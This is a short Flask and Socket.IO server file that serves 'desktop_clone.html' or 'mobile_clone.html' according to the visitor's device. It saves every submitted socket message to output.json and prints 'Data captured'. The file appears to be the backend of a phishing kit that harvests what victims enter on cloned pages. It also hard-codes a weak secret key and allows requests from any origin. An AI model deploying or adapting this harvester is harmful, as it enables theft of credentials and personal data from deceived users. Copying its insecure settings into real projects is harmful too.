from flask import Flask, render_template, request, redirect
from flask_socketio import SocketIO, send
from json import loads, dump

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
app.debug = False
socketio = SocketIO(app,  cors_allowed_origins="*")


@app.route('/')
def index():
    if request.headers.get("User-Agent").find("Mobile") == -1:
        return render_template("desktop_clone.html")
    else:
        return render_template("mobile_clone.html")

@socketio.on('message')
def handleMessage(msg):
    with open('output.json', 'w') as f:
        dump(loads(msg), f)
        print("Data captured")
    send(msg, broadcast=True)

@socketio.on('ping-socket')
def handleMessage(msg):
    print(msg)
